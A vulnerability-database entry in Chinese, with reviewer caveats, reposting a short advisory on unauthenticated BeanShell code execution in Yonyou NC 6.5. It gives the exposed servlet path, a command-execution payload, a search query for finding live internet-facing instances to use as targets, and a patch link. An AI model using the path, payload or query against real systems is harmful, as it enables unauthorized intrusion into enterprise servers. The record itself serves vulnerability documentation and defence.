---
source: "MrWQ/vulnerability-paper"
title: "用友NC BeanShell BshServlet代码执行"
product: "用友NC BeanShell"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2021-30167"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "NC6.5"
prerequisites: "未授权暴露"
side_effects: "命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/XEaNNjYs2FJ5RruFwAiIrg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/CNVD-2021-30167%EF%BC%9A%E7%94%A8%E5%8F%8B%20NC%20BeanShell%20RCE%20%E5%A4%8D%E7%8E%B0.md"
id: "vw-b49cba74d32f0e07a0f8b56c"
entity_id: "ve-b49cba74d32f0e07a0f8b56c"
schema_version: "1"
---

# 用友NC BeanShell BshServlet代码执行

## 条目说明

- 对象与具体问题：用友NC BeanShell；BshServlet代码执行
- 版本、配置及部署条件：NC6.5
- 认证与权限前提：未授权暴露
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 国外在线环境用公网搜索代替靶场，应改隔离授权环境说明
- 补丁URL问号后空格需修；第三方jar漏洞应区分功能暴露与组件自身缺陷
- 无精确修复build

## 操作风险

命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XEaNNjYs2FJ5RruFwAiIrg)

**上方蓝色字体关注我们，一起学安全！**

**作者：****蚂蚁** **@Timeline Sec**

**本文字数：361**

**阅读时长：2～3min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

用友 NC 是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。  

**0x02 漏洞概述**  

  

用友 NC 由于对外开放了 BeanShell 接口，攻击者可以在未授权的情况下直接访问该接口，并构造恶意数据执行任意代码从而获取服务器权限。  

**0x03 影响版本**  

  

用友 NC6.5 版本  

**0x04 环境搭建**  

  

国外在线环境  

```
title=="YONYOU NC" && country="SG"
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2VRMbLFNeDG86EHTTlKfdLpUbAUKBoln77qNJoc9uBtVXGpyEBgY0cw/640?wx_fmt=png)  

**0x05 漏洞复现**  

  

1、访问  

/servlet/~ic/bsh.servlet.BshServlet  

得到如图：

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2x5APTG0WEmJ81DGbqbcnXQlsGCBxWrWzN8dYDqab0fxsibejKEPdokw/640?wx_fmt=jpeg)  

2、我们发现这里有执行代码的接口我们输入 payload 如：`exec("whoami");`即可看到命令执行成功  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgfo1p5qOx5JjUPyM1mkBb2q5GKyO5XbchHJnmLBb9TpBQI5OIfuwicKL87PGlnCVrYJL0JkWBwu7w/640?wx_fmt=png)  

**0x06 修复方式**  

  

该漏洞为第三方 jar 包漏洞导致，用友 NC 官方已发布安全补丁，建议使用该产品的用户及时安装该漏洞补丁包。  

补丁下载链接：

```
http://umc.yonyou.com/ump/querypatchdetailedmng? PK=18981c7af483007db179a236016f594d37c01f22aa5f5d19
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
